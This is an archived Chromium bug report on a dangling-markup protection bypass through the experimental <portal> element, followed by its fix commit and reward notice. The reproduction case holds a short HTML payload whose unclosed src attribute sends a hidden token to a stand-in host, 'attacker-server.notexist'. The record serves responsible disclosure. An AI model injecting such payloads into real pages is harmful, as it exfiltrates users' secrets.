# Security: dangling markup protection bypass with <portal> element

| Field | Value |
|-------|-------|
| **Issue ID** | [40095175](https://issues.chromium.org/issues/40095175) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Blink>Portals |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | mi...@bentkowski.info |
| **Assignee** | lf...@chromium.org |
| **Created** | 2019-05-26 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

This is an extremely minor issue. Chrome has a feature that blocks dangling markup attacks (<https://www.chromestatus.com/feature/5735596811091968>). For some reason, this feature doesn't work for <portal>.src making it possible to exfiltrate data.

**VERSION**  

Chrome Version: 76.0.3805.0 Canary with #enable-portals  

Operating System: macOS 10.14.5

**REPRODUCTION CASE**

<!-- The following request will get blocked by Chrome... -->

<img src='<https://attacker-server.notexist>?  

<input token="magic\_value\_1234" type='hidden'>

<!-- ... but that doesn't happen with the <portal> tag,
and the data will go to the external server. -->

<portal src='<https://attacker-server.notexist>?  

<input token="magic\_value\_1234" type='hidden'>

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: Michal Bentkowski

## Timeline

### ts...@chromium.org (2019-05-28)

[Empty comment from Monorail migration]

[Monorail components: Blink>HTML>Portal]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-06-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/4a1f601ec3e9802bf06cb6a5d469af0ce8f801d9

commit 4a1f601ec3e9802bf06cb6a5d469af0ce8f801d9
Author: Lucas Furukawa Gadani <lfg@chromium.org>
Date: Thu Jun 18 15:34:59 2020

Portals: Apply dangling markup restrictions to <portal> element.

Bug: 967204
Change-Id: I276e6f8d8bdc3d317f5ce58f138d77601ee3c878
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2248059
Reviewed-by: Mike West <mkwst@chromium.org>
Commit-Queue: Lucas Gadani <lfg@chromium.org>
Cr-Commit-Position: refs/heads/master@{#779832}

[modify] https://crrev.com/4a1f601ec3e9802bf06cb6a5d469af0ce8f801d9/third_party/blink/renderer/core/html/portal/html_portal_element.cc
[add] https://crrev.com/4a1f601ec3e9802bf06cb6a5d469af0ce8f801d9/third_party/blink/web_tests/wpt_internal/portals/portals-dangling-markup.sub.html
[add] https://crrev.com/4a1f601ec3e9802bf06cb6a5d469af0ce8f801d9/third_party/blink/web_tests/wpt_internal/portals/resources/checkReport.sub.js
[add] https://crrev.com/4a1f601ec3e9802bf06cb6a5d469af0ce8f801d9/third_party/blink/web_tests/wpt_internal/portals/resources/report.py


### lf...@chromium.org (2020-06-18)

[Empty comment from Monorail migration]

### [Deleted User] (2020-06-20)

[Empty comment from Monorail migration]

### na...@google.com (2020-06-22)

[Empty comment from Monorail migration]

### na...@google.com (2020-06-24)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-06-24)

Congrats! The Panel decided to award $500 for this report

### na...@google.com (2020-06-24)

[Empty comment from Monorail migration]

### [Deleted User] (2020-09-25)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ef...@google.com (2020-10-12)

[Empty comment from Monorail migration]

[Monorail components: Blink>Portals]

### ef...@google.com (2020-10-12)

[Empty comment from Monorail migration]

[Monorail components: -Blink>HTML>Portal]

### is...@google.com (2020-10-12)

This issue was migrated from crbug.com/chromium/967204?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095175)*
